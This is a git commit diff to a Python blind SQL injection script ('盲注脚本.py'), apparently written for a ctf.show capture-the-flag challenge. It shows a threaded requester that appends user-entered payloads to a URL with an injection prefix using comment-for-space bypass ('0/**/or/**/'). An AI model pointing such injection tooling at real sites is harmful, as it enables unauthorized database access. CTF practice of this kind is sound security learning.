aa4df21debc4ebfe0e921550d06d9b6c67750cb5
whb54012 <1226844928@qq.com>
2026-07-27 08:52:16 +0000

    自动提交：更新 ${2026/7/27 16:52ilenPM52e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -5,14 +5,15 @@ import warnings
 warnings.filterwarnings("ignore")
 word=""
 end=int(input())
-def fun(url,result1,result2):
-    reponse=requests.get(url)
 url = "https://ebf0be59-85f5-4005-acd9-0d931dfb4e8c.challenge.ctf.show/index.php?id=0/**/or/**/"
+data=input()
+def fun(result1,result2):
+    reponse=requests.get(url+data)
 result1=queue.Queue()
 result2=queue.Queue()
 for i in range(1,end):
     result1.put(i)
     result2.put(i)
 for  i in range(1,26):
-    t=threading.Thread(target=fun,args=(url,result1,result2))
+    t=threading.Thread(target=fun,args=(result1,result2))
     t.start()
